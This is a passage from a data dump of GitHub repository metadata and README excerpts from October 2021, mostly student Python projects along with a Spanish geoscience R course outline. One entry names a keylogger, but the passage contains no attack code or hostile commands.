requeridas: Durante el curso corto necesitaremos herramientas como:  SQL, R, Rstudio, QGis.  La instalación de paquetes para Rstudio en máquina local: Usaremos constantemente: install.packages(c(""tidyverse"", ""sf"", ""raster"", ""mapview"", ""dplyr"")) Estructura del Curso Corto: El curso constará de partes teórica-práctica, la mayoría estará basado en la práctica con material bibliográfico detallado del proceso. Teoría: Desarrollada Semidetallada. Práctica: Desarrollada Exhaustivamente. Toda la información estará como PDFs en los folderes adjuntos, además de formatos .html para que lo entregado no pierda interactividad y sea cual se ha desarrollado cada clase. Se puede descargar todo el material desde este github.  Logueo y registro por primera vez  !!Esto solo funcionará la tarde del curso corto!! Cronograma Agenda  Introducción: Instalación de softwares (1 semana antes).  Parte I:  Joseps Andrade Tema IA: Base de Datos Geoespacial.  Parte II:  Alonso Otiniano Tema IIA: R y Rstudio. Alonso Otiniano Tema IIB: Conexión y Estadística Básica. Alonso Otiniano Tema IIC1: AED Aguas Superficiales (Subcuenca Hornillos Alto). Joseps Andrade Tema IIC2: AED Aguas Subterráneas (Zona Sur del Perú). Alonso Otiniano Tema IIC3: AED Suelos (Honoria-Tournavista). Fernandez Geraldino Tema IID1: AED Geoquímica Sedimentos de Quebrada (Proyecto Minero Colca y Jala Oca). Fernandez Geraldino Tema IID2: AED Geoquímica de Rocas (Proyecto Minero Colca y Jala Oca).  Parte IIIA: Alonso Otiniano  Introducción a Data Geoespacial en R. Introducción a Geoestadística en R. Introducción a 3D análisis en R. Machine Learning Aplicado a Geología.  Parte IIIB:  Machine Learning Aplicado a Aguas Superficiales. Machine Learning No Supervisado en Clusterización Geoquímica. Artificial Neural Networks aplicado a Peligros Geológicos. Design of a predictive model of a rock breakage by blasting using Artificial Neural Networks.  Parte IV: Desarrollos Diversos Interactivos: Dashboard, Presentaciones web-base, aplicativos software, APIs Machine Learning, Paquetes y Modelos. Descansos Oficiales    Time Activity     15:30 - 15:35 Coffee break   16:50 - 17:00 Coffee break    Instructores Reseña será dada al momento del desarrollo del curso. Para hacer reloggin: Esto estará a cargo del ACECIG.   This work is licensed under a Creative Commons Attribution 4.0 International License. "
417379612;2019-Weather-station;https://github.com/KenzoVH/2019-Weather-station;Python;2021-10-15T05:33:14Z;0;0;0;2019-Weather-station Repository for my 2019 finals project, a smart weather station with online dashboard that shows graphs and previously recorded values. Utilizes Python, HTML, CSS, Socketio, JS, etc. This project is currently not in working order as I no longer have acces to the hardware used for the physical side of this project, however, the code is still valid. 
417380936;Prorpose-Saving-Spend-Analysis;https://github.com/MvMukesh/Prorpose-Saving-Spend-Analysis;Jupyter Notebook;2021-10-15T05:40:50Z;0;0;0;Deep-Into-Spend-Analysis Sharing Spend-Analysis Project(solution along with saving opportunity) which is based on a Poultry Farm located in India, this work includes Data Analysis Report (word doc and ppt)| Tableau  Dashboard | Python Code(Jupyter Notebook) | Saving PPT I will add more detail soon..... 
417340130;Zach-TTS;https://github.com/Mr-warriyo/Zach-TTS;Python;2021-10-15T02:03:33Z;0;0;0;Zach-TTS Zach TTS is a Python Text to Speech Bot, which can convert any text into Speech easily!  I created ZACH TTS on Android Device, so other coders can also use it if they have to code on mobile for some reasons & don't have a pc. But the code still works on pc too..   REQUIREMENTS -  1 - Python 2 - PIP  Required Apps -   [ Only if you're Coding on Android Device ]  1 - ASTRO IDE [ Will be used as Code Editor ] 2 - TERMUX APP [ Will be used as Terminal ]   Terminal Setup -  Step 1 - Install gTTS via pip pip install gTTS   Once you're Completed with all the Requirements & Setup stuff, Run the main file(zach.py) via python zach.py  In Termux's Terminal.  Demo Video (YT)  My Portfolio  My Discord Server (For Coding Support)  My YouTube Channel (Coding Channel)  
417350744;ddg_img_tools;https://github.com/matheusfillipe/ddg_img_tools;Python;2021-10-15T02:56:46Z;0;0;0;
417372456;BlackJack;https://github.com/MohammedArab1/BlackJack;Python;2021-10-15T04:53:25Z;0;0;0;BlackJack BlackJack game I made while learning python, proud of this because it showcases my progress with python. I did it mostly on my own but had to use some tutorials here and there, took me approximately two days. Made this on August 28th-29th 2021. 
417370585;cat_in_x_flavors;https://github.com/lrth06/cat_in_x_flavors;C;2021-10-15T04:42:46Z;1;1;0;"CAT IN X FLAVORS The goal of this repository is to replicate the familiar ""cat"" command in as many languages as I can. Full, and additional functionality will be added, but currently the models simply read the file contents to a string in the console, warn you in the event that there was no file given, or if the file you've specified cannot be opened. Usage Installation Options git clone https://github.com/lrth06/cat_in_x_flavors.git #HTTPS # OR git clone git@github.com:lrth06/cat_in_x_flavors.git #SSL cd cat_in_x_flavors # OPTIONAL (recommended) - Run in docker docker build . -t lrth06/catinx docker run  -it -v $(pwd):/github.com/lrth06/app lrth06/catinx languages   Go   cd golang go build  -o ./ gocat /path/to/your/file   Python   cd python python3 pycat.py /path/to/your/file   NodeJS   cd nodejs npm install -g . nodecat /path/to/your/file   C   cd c gcc ccat.c -o ccat ./ccat /path/to/your/file   C++   cd cpp g++ -o cppcat ./cppcat.cpp ./cppcat /path/to/your/file   Rust   cd rust cargo build cargo run /path/to/your/file   Perl   cd perl perl perlcat.pl /path/to/your/file   Ruby (in progress)   "
417320594;AerForgeSDL;https://github.com/Aermoss/AerForgeSDL;Python;2021-10-15T00:22:17Z;0;0;0;AerForgeSDL A game engine made with SDL. Getting Started  Install Python Open cmd/terminal and type:  pip install AerForgeSDL  Examples Creating a window from aerforgesdl import *  forge = Forge()  while True:     forge.update() Creating a cube from aerforgesdl import *  forge = Forge()  class Cube(GameObject):     def __init__(self):         super().__init__(             window = forge,             width = 20,             height = 20,             x = 0,             y = 0,             color = (0, 255, 255)         )          self.center()  cube = Cube()  while True:     cube.update()     forge.update() 
417344970;Linear-Regression-Income-Prediction-Per-Capita;https://github.com/tathagatasengupta2000/Linear-Regression-Income-Prediction-Per-Capita;Jupyter Notebook;2021-10-15T02:28:01Z;0;0;0;
417362871;IEEE-754-Encoder-Decoder;https://github.com/sahibnanda/IEEE-754-Encoder-Decoder;Python;2021-10-15T03:59:45Z;0;0;0;IEEE-754-Encoder-Decoder An IEEE-754 encoder/decoder that convert floating-point numbers to a decimal representation and back to floating-point, depending on the operation chosen. Implemented using Python with fully functional GUI implemented utilizing Pygame. This project was completed in a group of 3. 
417323713;exploratoty_data_analysis_WoS;https://github.com/leilaff89/exploratoty_data_analysis_WoS;Jupyter Notebook;2021-10-15T00:39:03Z;0;0;0;Exploratory Data Analysis using Web of Science data Exploratory data analysis based on data obtained on the Web of Science platform using Python, Vos viewer and analysis of Web of Science itself. The questions to be answered were based on the paper “A Bibliometric Analysis of Edge Computing for the Internet of Things”. 
417336826;monitoria-MP;https://github.com/momoyo-droid/monitoria-MP;Python;2021-10-15T01:47:06Z;1;1;0;"Solução dos códigos dados na monitoria do curso ""Meninas Programam"" O intuito das aulas e monitorias dadas por mim e outros discentes da graduação é incentivar o ingresso dessas alunas em carreiras de computação. Para mais informações: https://sites.google.com/icmc.usp.br/meninasprogramadoras "
417344340;Random-Password-Generator;https://github.com/NashwanKhan/Random-Password-Generator;Python;2021-10-15T02:25:02Z;0;0;0;Random-Password-Generator I am learning how to make simple Python Scripts, with my current knowledge. I'm fine with any negative or positive feedback that can help create similar code, but using more in-depth functions, objects, etc. To help me improve my code 
417349921;Ezy-Parking;https://github.com/prathimacode-hub/Ezy-Parking;;2021-10-15T02:52:47Z;0;0;0;"Welcome to Ezy-Parking 👋           📌Repository Ezy-Parking is a complete parking management system applying smart solutions for short time rental of empty spaces (Parking, Apartment, Office Spaces etc). This website is designed to helps users find safe, affordable and low cost parking to get rest easy while on a hustle. This is a most prominent trouble especially in metropolitan and tier-1 cities where vehicles are used at maximum potential in their daily lives. With no space to park their vehicles, it's evitable to have seen or prone to careless parking on roads or unauthorized places which disrupts the smooth flow of passages for society. ✔Features  It allows users to get suggestions on parking locations (renders on map with information of price and availability using area / pincode) based on their schedules one plans to attend. While searching, it also shows with events nearby. User can dynamically track empty parking spots to park their vehicles in a lot at the nearest slot available and releases slots as car surpasses the location. It allows to book/reserve the parking slots in prior to reaching the authorized parking lot. Opens up the gate/handle of parking lot for vehicles to enter the space using sensing techniques. While exiting, it automatically checks the complete history of the car using vehicle registration number (owner authority, licence checking, pending challans). With vehicle registration number and color of vehicle, user can easily track their vehicle location in a hump through their own device. Using sensor, it updates parking lot metrics which in turn is sent to database for users to view the details. If vehicle is parked in No parking zone, an user can detect vehicle owner details and email that the vehicle has been taken by RTO. Users can also share the best spots via posts for the community.  🙌Join Here 🚀 Join us to come up with a real-time parking solution to tackle and make this workflow more efficient towards effortless parking management system. 🔑Tech Stacks Skills : Machine Learning, Deep Learning, Computer Vision, Django, MySQL, IoT Programming Languages : Python, HTML, CSS, JS Contributors are expected to join this Discord Channel here for the project discussion : When raising an issue, do make sure to mention the kind of feature, feature title, short description of the feature and how would you expect it to work. As a good practice, always link the issue number with pull request. (#issue number : Give this details when you raise a PR). If you want to work on this unique project and share it with the world, you can do that here. Go through the contributing guidelines here. Subsequently, also go through the GitHub documentation on creating a pull request. ⌛Link To The Website https://prathimacode-hub.github.io/Ezy-Parking/ 🛠Templates to Follow  Feature request Bug Report Pull Request  Note : One should follow these templates while creating a new issue or pull request. 👨‍💻 Workflow:   Fork the repository   Clone your forked repository using terminal or gitbash.   Make changes to the cloned repository   Add, Commit and Push   Then in GitHub, in your cloned repository, find the option to make a pull request.    print(""Start contributing for Ezy-Parking"")  📜 Code Of Conduct You can find our Code of Conduct here. 📝 License This project follows the Mozilla Public License. 🙂 Project Admin         ⭐Give this Project a Star   If you liked working on this project, do ⭐ and share this repository. 🎉 🎊 😃 Happy Contributing 😃 🎊 🎉 Click here to view my other projects.  📬 Contact If you want to contact me, you can reach me through below handles.     © 2021 Prathima Kadari    "
417328423;Tarea-1-ProgIV;https://github.com/minuriri/Tarea-1-ProgIV;Python;2021-10-15T01:04:12Z;0;0;0;
417374217;new-;https://github.com/Adarshkumar2212/new-;;2021-10-15T05:03:09Z;0;0;0;"Linear-Regression Summary of the task: The repository contains python code used to train and build a machine learning model using simple linear regression. A small dataset was used consisting of two columns (height and weight). The data was first split into the training set and the test set; tools from the Scikit Learn Library were then used to build the main model. conclusion: There is a strong linear correlation between the heights and weights of the dataset in the form y=mx+c.  A model with high accuracy for predicting weights has been produced "
417509739;python;https://github.com/nathaliamcosta/python;;2021-10-15T13:29:08Z;8;8;2;
417480122;PythonBioCookbook;https://github.com/nickdelgrosso/PythonBioCookbook;Python;2021-10-15T11:47:16Z;0;0;10;Bioinformatics Cookbook A Collection of useful functions for basic manipulation of biological sequences in Python 
417547230;pythonFiles;https://github.com/barshanayak119/pythonFiles;Python;2021-10-15T15:23:21Z;1;1;8;
417514878;petuhlang;https://github.com/Animatea/petuhlang;Python;2021-10-15T13:45:38Z;6;6;2;"Non-English documentaion Russian | Русский SOON (PRE-ALPHA) What is petuhlang? Petuhlang is a joke-like language, based on Python. It updates builtins to make a new syntax based on operators rewrite. Classes from petuhlang import build build.using >> ""petuhlang""   class PythonClass:     def foo(self) -> None:         print(""bar"")   pyclass >> MyClass(extends=PythonClass)   function >> main(     arg(""user"") >> str,     kwarg(""greeting"", value=""Hello"") >> str, ) [     MyClass.createInstance(bindTo=""instance"") >> then [         console.log(f""It works:) -> {instance.__class__.__name__}"")     ] ]  main() Base functions from petuhlang import build build.using >> ""petuhlang""   function >> main() [     retrieve >> (1 + 1) ]  console.log(main()) "
417523998;Hacktoberfest21-PythonCodes;https://github.com/TheAppWizard/Hacktoberfest21-PythonCodes;Python;2021-10-15T14:12:37Z;1;1;3;Hacktoberfest21-PythonCodes  
417502860;python;https://github.com/yashk8320/python;;2021-10-15T13:06:48Z;1;1;0;
417555112;python;https://github.com/vanessatucker884/python;Roff;2021-10-15T15:49:08Z;0;0;0;python https://github.com/vanessatucker884/python/blob/c37ae6b7ca5a0df6baf7ad2b6384ba006ecb8019/lung_bioactivity_data_preprocessed_class_pIC50.csv 
417453800;Python;https://github.com/Ikerus0610/Python;Python;2021-10-15T10:08:12Z;0;0;0;
417541815;python;https://github.com/wardriver21/python;;2021-10-15T15:06:45Z;0;0;0;
417439128;Python;https://github.com/Bllrt-cindy/Python;Python;2021-10-15T09:16:09Z;0;0;0;
417435609;Python;https://github.com/NicholasWhit3/Python;Python;2021-10-15T09:03:59Z;0;0;0;
417424343;python;https://github.com/Uzlipat/python;;2021-10-15T08:27:05Z;0;0;0;python studies 
417473232;Python;https://github.com/EramKafeel/Python;Python;2021-10-15T11:21:28Z;0;0;0;
417471391;Python;https://github.com/mahyaloni/Python;Python;2021-10-15T11:14:30Z;0;0;0;
417528229;python;https://github.com/shubhamjoshi99899/python;;2021-10-15T14:25:24Z;0;0;0;
417554160;Python;https://github.com/Drako01/Python;Python;2021-10-15T15:45:50Z;0;0;0;
417457760;Python;https://github.com/HyeLynnKIM/Python;;2021-10-15T10:23:24Z;0;0;0;Python 
417542470;Python;https://github.com/agDimpu/Python;Jupyter Notebook;2021-10-15T15:08:55Z;0;0;0; Learn Python Programming 
417523778;Python;https://github.com/Jacopo-Spadon/Python;Jupyter Notebook;2021-10-15T14:12:00Z;0;0;0;
417446013;python;https://github.com/GabinusMagnus/python;Python;2021-10-15T09:40:09Z;0;0;0;python programmes python programmes divers et variés juste simplets fait par un simplet. 
417523985;Python;https://github.com/Kruthika-N/Python;;2021-10-15T14:12:35Z;0;0;0;Python 
417485134;python;https://github.com/Azathoth-su/python;;2021-10-15T12:05:24Z;0;0;0;python 项目描述 
417502428;python;https://github.com/DanieRomanov/python;;2021-10-15T13:05:21Z;0;0;0;
417524286;python;https://github.com/meimeilu/python;Python;2021-10-15T14:13:25Z;0;0;0;python 
417538122;Python;https://github.com/legna7/Python;Python;2021-10-15T14:55:35Z;0;0;0;"Python Resolucoes de exercicios da aula no Course em Video do professor Gustavo Guanabara. Indicado para iniciantes na linguagem do Python. As resolucoes sao divididas em tres mundos:  Mundo 1: (variaveis, operadores, modulos, manipulacoes de textos e, cores); Mundo 2: (condicoes, estrutura de repeticoes); Mundo 3: (listas, turplas, dicionarios, funcoes, modulos e pacotes).  "
417522949;Python;https://github.com/julian1david/Python;Python;2021-10-15T14:09:32Z;0;0;0;"""# Python"" "
417515261;Python;https://github.com/killianmeehan/Python;Jupyter Notebook;2021-10-15T13:46:50Z;0;0;0;
417482387;python;https://github.com/Seriivol/python;;2021-10-15T11:55:35Z;0;0;0;
417447061;python;https://github.com/Dipmeat/python;;2021-10-15T09:44:09Z;0;0;0;python Python 
417549159;python;https://github.com/inferred-friend/python;;2021-10-15T15:29:24Z;0;0;0;python 
417545554;python;https://github.com/kri80/python;;2021-10-15T15:18:06Z;0;0;0;
417450045;PYTHON;https://github.com/SivaKrishna28/PYTHON;Jupyter Notebook;2021-10-15T09:54:47Z;0;0;0;PYTHON 
417492464;python;https://github.com/Computing-Class/python;Jupyter Notebook;2021-10-15T12:31:23Z;0;0;0;
417517500;Python;https://github.com/ChandraMouliDasari/Python;;2021-10-15T13:53:50Z;0;0;0;Python 
417422906;python;https://github.com/jassmeetkaur/python;Python;2021-10-15T08:22:22Z;0;0;0;
417423261;python;https://github.com/womonge/python;Python;2021-10-15T08:23:32Z;0;0;0;python Repository for practise 
417493465;python;https://github.com/dwacuka/python;;2021-10-15T12:35:07Z;0;0;0;python 
417523162;Python;https://github.com/mmysliwiec2112/Python;Python;2021-10-15T14:10:13Z;0;0;0;
417481082;Python;https://github.com/TheGiordanos/Python;;2021-10-15T11:50:42Z;0;0;0;
417490181;Python;https://github.com/OlgaSautina/Python;;2021-10-15T12:23:30Z;0;0;0;
417447324;Python;https://github.com/Bjkrit/Python;;2021-10-15T09:45:06Z;0;0;0;
417419421;python;https://github.com/FengxiaoxiaoC/python;;2021-10-15T08:10:01Z;0;0;0;learn 
417419198;python;https://github.com/tommygina/python;Python;2021-10-15T08:09:19Z;0;0;0;python 
417527482;Python;https://github.com/agodfrey12/Python;;2021-10-15T14:23:12Z;0;0;0;Python All python and circuit python code 
417515965;python;https://github.com/juliyamakutu/python;;2021-10-15T13:49:03Z;0;0;0;python Домашние задания по курсу Основы языка Python 
417483997;Python;https://github.com/zohaibzsm/Python;;2021-10-15T12:01:31Z;0;0;0;Python All Python projects are in this repo. 
417442052;Python;https://github.com/aarti00128/Python;;2021-10-15T09:26:18Z;0;0;0;Python 
417450004;Python;https://github.com/anyelaaa/Python;;2021-10-15T09:54:37Z;0;0;0;
417489119;python;https://github.com/JeevanKumarN/python;;2021-10-15T12:19:40Z;0;0;0;
417555661;python;https://github.com/embedded-sense/python;Shell;2021-10-15T15:50:58Z;0;0;0;
417454590;Python;https://github.com/AlexPC23/Python;Python;2021-10-15T10:11:11Z;0;0;0;
417536449;PYTHON;https://github.com/ferranfal/PYTHON;Python;2021-10-15T14:50:22Z;0;0;0;PYTHON 
417468231;Python;https://github.com/wagnermaki/Python;Python;2021-10-15T11:02:56Z;0;0;0;Python 
417558002;Python;https://github.com/Jonathanst1/Python;Python;2021-10-15T15:58:40Z;0;0;0;Python 
417484870;Python;https://github.com/AnswerFinder/Python;;2021-10-15T12:04:35Z;0;0;0;
417421341;python;https://github.com/inthesnow/python;Python;2021-10-15T08:16:39Z;0;0;0;python 알고리즘을 위한 파이썬 기조 연습 레파지토리 
417539193;python;https://github.com/acarnevali/python;Python;2021-10-15T14:58:48Z;0;0;0;python 
417505730;Python;https://github.com/Umadevi-amin/Python;;2021-10-15T13:16:08Z;0;0;0;"Uma #include<stdio.h> int main() { int a,b; if(a==b) { print(a); break; } else { print(b); } "
417532045;PythonTools;https://github.com/wenhaofang/PythonTools;Python;2021-10-15T14:37:05Z;0;0;0;Python Tools In this repository, I will collect some useful Python snippets in my coding routine. Existing snippets are listed as follows.  Timeout: A decorator to check whether the execution of a function is timeout. Retry: A decorator to repeat the execution of a function for specified times.  
417438737;PythonCourse;https://github.com/Nasirkhan94/PythonCourse;;2021-10-15T09:14:51Z;0;0;0;PythonCourse Repository for CSSM-502 Advanced Python for data Analysis Course 
417432012;pythonProject;https://github.com/wiut00012670/pythonProject;Python;2021-10-15T08:52:25Z;0;0;0;
417429807;PythonDS;https://github.com/sshweta9876/PythonDS;Python;2021-10-15T08:45:11Z;0;0;0;
417433200;pythonProject;https://github.com/mumtik25/pythonProject;Python;2021-10-15T08:56:07Z;0;0;0;
417435115;PythonPractice;https://github.com/sshivam245/PythonPractice;Python;2021-10-15T09:02:13Z;0;0;0;
417460315;PythonBasic;https://github.com/dpawanpawar/PythonBasic;;2021-10-15T10:32:40Z;0;0;0;
417488852;pythonPractice;https://github.com/shanmuted/pythonPractice;Python;2021-10-15T12:18:40Z;0;0;0;
417431574;pythonProject;https://github.com/00011758/pythonProject;Python;2021-10-15T08:51:00Z;0;0;0;
417428458;pythonProject;https://github.com/00014932/pythonProject;Python;2021-10-15T08:40:40Z;0;0;0;
417543030;PythonTry;https://github.com/Idolnanib/PythonTry;;2021-10-15T15:10:51Z;0;0;0;PythonTry 
417441099;pythonKeylogger;https://github.com/jovanneste/pythonKeylogger;Python;2021-10-15T09:23:03Z;0;0;0;pythonKeylogger Simple keylogger in Python Deployment python keylogger.py 
417435169;pythonProject;https://github.com/ssardorbek/pythonProject;Python;2021-10-15T09:02:24Z;0;0;0;
417437303;PythonGuide;https://github.com/ajcltm/PythonGuide;;2021-10-15T09:09:49Z;0;0;0;"Numpy  random   np.random.rand() : [0.0, 1.0] 임의값 반환하며 shape으로 입력 시 array 반환(미입력 시 scalar)  [in] np.random.rand(2, 3)  [out] array([[0.41140371, 0.98738577, 0.42903107],        [0.93806615, 0.45240497, 0.12544594]])  np.random.random() : [0.0, 1.0) 임의값 반환하며, shape를 튜플로 입력해야함(미입력 시 scalar)  [in] np.random.random((2,3))  [out] array([[0.41140371, 0.98738577, 0.42903107],        [0.93806615, 0.45240497, 0.12544594]])  np.random.randn() : -1과 1사이의 값을 반환함 (가우시안 분포), shape으로 입력 시 array 반환(미입력 시 scalar)  [in] np.random.randn(2,3)  [out] array([[ 0.40054939,  0.30965968, -0.50036237],        [ 0.64300747,  1.56065243, -0.33234598]])  np.random.randint() : 입력값들 사이의 정수를 반환함 (균등 분포), 인자는 다음과 같음 -> low : int, high:int (optional), size : int or tuple  [in] np.random.randint(-100, 100, size=(2,3))  [out] array([[-62,  10,  -8],        [ 70,  36, -68]])  Time  datetime   현재 일자 및 시각 생성  [in] datetime.now()  [out] datetime.datetime(2021, 10, 15, 17, 27, 57, 116839)  특정 일자 생성  [in] datetime.datetime(1923, 8, 29)  [out] datetime.datetime(1923, 8, 29, 0, 0)  datetime object를 str로 변환  [in] date = datetime.datetime(1923, 8, 29) date.strftime(format='%Y-%m-%d')  [out] '1923-08-29'  str을 datetime object로 변환 ! 주의 : 인자를 format='%Y-%m-%d'이라고 쓰면 안됨  [in] date = '1923-8-29' datetime.datetime.strptime(date, '%Y-%m-%d')  [out] datetime.datetime(1923, 8, 29, 0, 0)  기간 리스트 만들기  [in] start = datetime.datetime.strptime(""1923-08-29"", ""%Y-%m-%d"") end = datetime.datetime.strptime(""1923-09-03"", ""%Y-%m-%d"") date_generated = [start + datetime.timedelta(days=x) for x in range(0, (end-start).days)]  dayList = [] for date in date_generated:     dayList.append(date.strftime(""%Y%m%d""))  dayList  [out] ['19230829', '19230830', '19230831', '19230901', '19230902']  datetime에 3개월 더하는 방법 (timedelta는 시간, 일, 주 단위 연산만 가능)  [in] from dateutil.relativedelta import relativedelta  date = datetime.datetime(1923, 8, 29) date + relativedelta(months=3)  [out] datetime.datetime(1923, 11, 29, 0, 0) Pandas에서 시간 다루기   특정열을 datetime 포맷으로 변경  [in] date = ['1923-08-29','1923-08-30','1923-09-01','1923-09-02'] df = pd.DataFrame(date, columns=['date']) pd.to_datetime(df['date'], format='%Y-%m-%d')  [out] 0   1923-08-29 1   1923-08-30 2   1923-09-01 3   1923-09-02 Name: date, dtype: datetime64[ns]  datetime에 3개월 더하는 방법 (timedelta는 시간, 일, 주 단위 연산만 가능)  [in] quater = ['1923-1','1923-2','1923-3','1923-4'] df = pd.DataFrame(quater, columns=['quater'])  df['quater'].apply(lambda x:pd.Period(x[:-1] + ""Q"" + x[-1:], freq=""M""))  [out] # 월로 변환되었음(1923-3 -> 1923-07) 0    1923-01  1    1923-04 2    1923-07 3    1923-10 Name: quater, dtype: period[M] "
417440352;pythonProject;https://github.com/galicine/pythonProject;;2021-10-15T09:20:24Z;0;0;0;
417441586;Python3;https://github.com/aliks9798/Python3;;2021-10-15T09:24:47Z;0;0;0;
417534513;PythonPractice;https://github.com/SkylerHill-Sky/PythonPractice;Python;2021-10-15T14:44:27Z;0;0;0;PythonPractice Getting back in the python swing 2021. For now i'm just holding some code here so I can easly access it, as I do bigger projects I will add more description. This project includes  iterations and arrays practice pyTest splicing list comprehension  
417430667;pythonProject;https://github.com/wiut11347/pythonProject;Python;2021-10-15T08:47:51Z;0;0;0;
417431798;pythonProject;https://github.com/Dilnoza26/pythonProject;Python;2021-10-15T08:51:40Z;0;0;0;
417430737;pythonProject;https://github.com/00011310/pythonProject;Python;2021-10-15T08:48:06Z;0;0;0;
417496020;PythonLDA;https://github.com/mxs3203/PythonLDA;;2021-10-15T12:44:02Z;0;0;0;
417503084;pythonProject;https://github.com/OZI248/pythonProject;;2021-10-15T13:07:34Z;0;0;0;
417438202;pythonProject;https://github.com/alisher775/pythonProject;Python;2021-10-15T09:12:51Z;0;0;0;
417429450;pythonProject;https://github.com/WiutStudent00012175/pythonProject;Python;2021-10-15T08:43:57Z;0;0;0;
417524703;pythonPrograms;https://github.com/thirukkumarant1/pythonPrograms;Python;2021-10-15T14:14:43Z;0;0;0;
417484093;PythonProgramzz;https://github.com/batcha333/PythonProgramzz;Python;2021-10-15T12:01:45Z;0;0;0;
417500349;PythonExample;https://github.com/Q3N-JX/PythonExample;Python;2021-10-15T12:58:53Z;0;0;0;PYTHON 3 BASIC EXAMPLES          
417481062;Python1;https://github.com/BenceXmc/Python1;;2021-10-15T11:50:36Z;0;0;0;Python1 Python 
417558609;pythonProject;https://github.com/Halley826/pythonProject;Jupyter Notebook;2021-10-15T16:00:50Z;0;0;0;
417425664;PythonFacultate;https://github.com/preksebe/PythonFacultate;;2021-10-15T08:31:28Z;0;0;0;
417517287;Python3-Crawler-projects;https://github.com/Shawshank-LIUYU/Python3-Crawler-projects;Python;2021-10-15T13:53:11Z;0;0;0;Python3-Crawler-projects Python3 爬虫实战项目，Python 3 practice of spiders. 🔨 本仓库中所有内容仅供学习交流，严禁用于商业用途、非法用途，否则由此产生的一切后果均与作者无关，在本仓库中下载的文件学习完毕之后请于 24 小时内删除。  项目列表  豆瓣电影榜单Top250详细信息 _ requests、lxml、Xpath、re、csv、list  
417458240;pythonAndroidMonkey;https://github.com/alsrb968/pythonAndroidMonkey;Python;2021-10-15T10:25:11Z;0;0;0;pythonAndroidMonkey Android ADB UI Monkey Test Program 프로그램 실행 화면  실행 사전 설정  ADB모드 상태 PC와 USB 케이블 연결된 상태  가상환경 설정 python -m venv venv  pip upgrade Mac OS ./venv/bin/pip install --upgrade pip  Windows OS ./venv/Scripts/pip install --upgrade pip  pillow 설치 Mac OS ./venv/bin/pip install pillow  Windows OS ./venv/Scripts/pip install pillow  프로그램 실행 Mac OS ./venv/bin/python main.py  Windows OS ./venv/Scripts/python main.py  사용법  프로그램 실행 후 화면 터치하여 좌표 설정 '시작' 버튼 눌러 좌표 설정한 순서대로 500ms마다 tap 수행 '종료' 버튼 눌러 동작 중지  
417432030;pythonProjec23162;https://github.com/Dilnoza26/pythonProjec23162;Python;2021-10-15T08:52:30Z;0;0;0;
417536993;PythonForChemists;https://github.com/tjthecalculator/PythonForChemists;;2021-10-15T14:52:05Z;0;0;0;"PythonForChemists (WIP) This github repository is using for anyone who want to study python in chemistry. The content inside this repository will have a several part. Part 1: Basic python programming This part is the basic of python programming. For anyone who does not have any background for python programming or never used python before. Part 2: Intermediate python programming In this part, Part 3: Working with Library Python also have something called ""Library"". This part will focusing on using python library, such as numpy, scipy, matplotlib, pandas, and scikit-learn. Which is useful for scientific programming Part 4: Working with RDKit RDKit is another useful for chemistry "
417534359;PythonDiscordBot;https://github.com/DarwinCheese/PythonDiscordBot;Python;2021-10-15T14:43:56Z;0;0;0;
417495905;PythonAdvanced_EDA_Visualization;https://github.com/ironmanciti/PythonAdvanced_EDA_Visualization;Jupyter Notebook;2021-10-15T12:43:43Z;0;0;0;"BigDataML_Visualization ""# BigData_Analysis_Visualization"" ""# PythonAdvanced_EDA_Visualization"" ""# PythonAdvanced_EDA_Visualization"" ""# PythonAdvanced_EDA_Visualization"" "
417480947;Flex-PythonExtra;https://github.com/SHKlarenbeek/Flex-PythonExtra;;2021-10-15T11:50:10Z;0;0;0;Flex-PythonExtra Flex Python Extra opdrachten van Stijn Klarenbeek - S1D1 
417418309;pythonProject1;https://github.com/OlgaNikolPavlova/pythonProject1;;2021-10-15T08:06:28Z;0;0;0;
417470147;pythonRemoteAdminPrac;https://github.com/Ayydeeen/pythonRemoteAdminPrac;Python;2021-10-15T11:10:08Z;0;0;0;
417556776;gb_python2;https://github.com/shohina01/gb_python2;;2021-10-15T15:54:38Z;0;0;0;gb_python2 
417508322;PythonSynonymCrawler;https://github.com/nyjackielee/PythonSynonymCrawler;Python;2021-10-15T13:24:30Z;0;0;0;
417449006;Python_;https://github.com/Dipmeat/Python_;Jupyter Notebook;2021-10-15T09:51:06Z;0;0;0;#My Python This is my App 
417445150;Python15.10.21_1;https://github.com/Kolgasa/Python15.10.21_1;;2021-10-15T09:37:11Z;0;0;0;
417547992;pythonlists;https://github.com/Furkanar/pythonlists;;2021-10-15T15:25:47Z;0;0;0;pythonlists list compression 
417481169;pythongame;https://github.com/francesconmatteo/pythongame;Python;2021-10-15T11:51:04Z;0;0;0;pythongame 
417528082;pythonpractice;https://github.com/stvrde/pythonpractice;;2021-10-15T14:25:00Z;0;0;0;pythonpractice 
417532726;pythontgame;https://github.com/ghostofuchiha/pythontgame;Python;2021-10-15T14:39:02Z;0;0;0;
417556412;pythoncode;https://github.com/louistghost88/pythoncode;Python;2021-10-15T15:53:32Z;0;0;0;
417504484;pythonproject;https://github.com/Ramaniempire113/pythonproject;Python;2021-10-15T13:12:12Z;0;0;0;pythonproject 
417479275;pythonproject;https://github.com/dhju/pythonproject;;2021-10-15T11:44:12Z;0;0;0;pythonproject 
417488499;pythonandr;https://github.com/iKlixWebServices/pythonandr;;2021-10-15T12:17:26Z;0;0;0;
417513945;pythonprograms;https://github.com/Rajeevv8/pythonprograms;Python;2021-10-15T13:42:48Z;0;0;0;
417520909;checker-Tiktok-v2-speed;https://github.com/2Kaito00/checker-Tiktok-v2-speed;Python;2021-10-15T14:03:47Z;0;0;0;checker-Tiktok-v2-speed Python 
417506664;IAlwaysTryMybest;https://github.com/yerinKim95/IAlwaysTryMybest;Python;2021-10-15T13:19:05Z;0;0;0;
417434455;Python-revision;https://github.com/ThuraTunScibotics/Python-revision;Jupyter Notebook;2021-10-15T09:00:23Z;0;0;0;
417440013;selenium_python;https://github.com/seakmengc/selenium_python;JavaScript;2021-10-15T09:19:07Z;0;0;0;selenium_python Forked from https://github.com/safak/youtube/tree/mern-ecommerce-app 
417462108;Python-Programs;https://github.com/shank-p/Python-Programs;Python;2021-10-15T10:39:54Z;0;0;0;
417493187;python_book;https://github.com/ourSherlock/python_book;;2021-10-15T12:34:02Z;0;0;0;python_book about python's book 
417521837;python_automation;https://github.com/mrtkcu/python_automation;Python;2021-10-15T14:06:25Z;0;0;0;simple python_automation program In the given example of excel file there are prices which has to be corrected. Imagine you have hundreds of them, it would be really hard for you to correct each price manually. With this python program, the prices column is updated to its next column automatically. And chart is also added which references the updated column. openpyxl library is used 
